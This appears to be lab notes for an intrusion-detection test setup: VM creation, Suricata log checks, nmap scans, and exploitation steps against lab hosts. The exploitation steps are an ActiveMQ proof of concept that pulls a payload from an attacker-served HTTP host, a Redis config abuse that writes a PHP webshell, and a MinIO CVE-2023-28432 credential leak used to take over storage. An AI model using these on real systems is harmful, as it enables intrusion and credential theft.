# Help


## Yandex Cloud

### Create VM
```bash
yc compute instance create \
  --name warfare-vm \
  --public-ip \
  --zone ru-central1-a \
  --hostname warfare-vm \
  --cores 2 \
  --memory 2GB \
  --create-boot-disk image-id=fd84n8eontaojc77hp0u,size=40GB,image-folder-id=standard-images \
  --ssh-key ~/.ssh/id_rsa.pub \
  --core-fraction 50
```

## General

### Resize vagrant disk
```bash
df -h
lsblk
sudo pvresize /dev/sda3
sudo lvextend -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv
sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv
sudo cfdisk /dev/sda
```

### Check iptables:
```bash
sudo iptables -L DOCKER-USER -nv --line-numbers
```

### Check Suricata logs:
```bash
journalctl -u suricata.service -b
sudo tail -n 200 /var/log/suricata/suricata.log
sudo tail -n 0 -f /var/log/suricata/fast.log
sudo tail -n 0 -f /var/log/suricata/eve.json | jq .
```

### Run Suricata:
```bash
sudo suricata -c /etc/suricata/suricata.yaml -q 0
```

### Run NMAP scan:
```bash
nmap -sS victim     # SYN scan
nmap -sX victim     # Xmas scan
nmap -sU victim     # UDP scan
nmap -O victim      # OS detection
```

## Vulnerabilities

### 1. ActiveMQ
```bash
nmap -sV -p 61616,8161 172.20.0.101
curl -I http://172.20.0.101:8161/
cd /opt
python3 -m http.server 8888
python3 poc.py -i 172.20.0.101 -p 61616 -u http://172.20.0.10:8888/poc.xml
```

### 2. Redis Unauthorized Access + Command Execution
```bash
nmap -sV -p 6379 172.20.0.102
redis-cli -h 172.20.0.102 ping
redis-cli -h 172.20.0.102
>>> info server
>>> config get "*"
>>> keys *
>>> dbsize
>>> config set dir /tmp
>>> config set dbfilename webshell.php
>>> set test "<?php system($_GET['cmd']); ?>"
>>> save
```

### 3. Minio
```bash
nmap -sV -p 9000,9001 172.20.0.103
curl -I http://172.20.0.103:9000/
curl -I http://172.20.0.103:9001/
curl -X POST http://172.20.0.103:9000/minio/bootstrap/v1/verify \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "" | jq '.MinioEnv.MINIO_ROOT_USER, .MinioEnv.MINIO_ROOT_PASSWORD'
```

Then we can use the AWS CLI to exploit the vulnerability
```bash
aws configure set aws_access_key_id minioadmin
aws configure set aws_secret_access_key minioadmin-vulhub
aws configure set region us-east-1
aws --endpoint-url http://172.20.0.103:9000 s3 mb s3://cve-2023-28432-pwned make_bucket: cve-2023-28432-pwned
echo "MinIO Cluster compromised via CVE-2023-28432!" > cve_exploit_proof.txt
echo "Stolen credentials: minioadmin:minioadmin-vulhub" >> cve_exploit_proof.txt
aws --endpoint-url http://172.20.0.103:9000 s3 cp cve_exploit_proof.txt s3://cve-2023-28432-pwned/
aws --endpoint-url http://172.20.0.103:9000 s3 ls s3://cve-2023-28432-pwned/
```
